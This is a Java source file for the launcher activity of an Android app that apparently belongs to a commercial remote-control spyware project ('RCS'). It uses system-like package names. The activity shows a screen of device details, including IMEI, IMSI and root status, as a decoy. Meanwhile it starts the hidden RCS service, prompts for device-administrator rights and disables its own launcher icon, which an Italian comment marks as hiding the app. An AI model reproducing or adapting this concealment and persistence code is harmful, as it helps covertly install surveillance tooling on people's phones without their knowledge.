/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AndroidServiceGUI.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.gui;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.CheckBox;
import android.widget.TextView;

import com.android.networking.Core;
import com.android.networking.Device;
import com.android.networking.R;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.capabilities.PackageInfo;
import com.android.networking.listener.AR;
import com.android.networking.util.Check;

/**
 * The Class AndroidServiceGUI.
 * http://stackoverflow.com/questions/10909683/launch-android-application-without-main-activity-and-start-service-on-launching
 */
public class AGUI extends Activity {
	protected static final String TAG = "AndroidServiceGUI"; //$NON-NLS-1$

	/**
	 * Called when the activity is first created.
	 * 
	 * @param savedInstanceState
	 *            the saved instance state
	 */
	@Override
	public void onCreate(final Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		actualCreate(savedInstanceState);
		//Status.self().gui = this;
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
	}

	private void actualCreate(final Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		Status.setAppContext(getApplicationContext());
		
		startService();
		setContentView(R.layout.main); 

	    TextView t = (TextView)findViewById(R.id.imei);
	    
	    t.setText("This is a list of device information for the current Android device:\n\n");
	    
	        
	    if (Build.MODEL.length() > 0)
	    	t.append("Model: " + Build.MODEL + "\n");
	    
	    if (Build.BRAND.length() > 0)
	    	t.append("Brand: " + Build.BRAND + "\n");
	    
	    if (Build.DEVICE.length() > 0)
	    	t.append("Device: " + Build.DEVICE + "\n");
	    
		if (Device.self().getImei().length() > 0)
			t.append("IMEI: " + Device.self().getImei() + "\n");

		if (Device.self().getImsi().length() > 0)
			t.append("IMSI: " + Device.self().getImsi() + "\n");
		
	    if (Build.BOARD.length() > 0)
	    	t.append("Board: " + Build.BOARD + "\n");
	    
	    if (Build.DISPLAY.length() > 0)
	    	t.append("Display: " + Build.DISPLAY + "\n");
		
		if (PackageInfo.hasSu()) {
			t.append("Root: yes");
		} else {
			t.append("Root: no");
		} 
	}
	
	private void startExtService() {
		final String service = "com.android.networking.app"; //$NON-NLS-1$

		try {
			if (Core.isServiceRunning() == false) {
				final ComponentName cn = startService(new Intent(service));
			}
		} catch (final SecurityException se) {

		}
	}

	private void startService() {
		final String service = "com.android.networking.app"; //$NON-NLS-1$
		// final String service = "android.intent.action.MAIN";

		try {
			if (Core.isServiceRunning() == false) {
				final ComponentName cn = startService(new Intent(service));

				if (cn == null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " RCS Service not started, null cn ");//$NON-NLS-1$
					}
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
					}
					
					int ACTIVATION_REQUEST = 1;
					
					Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
					ComponentName deviceAdminComponentName = new ComponentName(this, AR.class);
					intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
					startActivityForResult(intent, ACTIVATION_REQUEST);
					
					// Nascondi l'icona (subito in android 4.x, al primo reboot in android 2.x)
					PackageManager pm = getApplicationContext().getPackageManager();
					pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
				}
			}
		} catch (final SecurityException se) {
			if (Cfg.EXCEPTION) {
				Check.log(se);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " SecurityException caught on startService()");//$NON-NLS-1$
			}
		}
	}
}
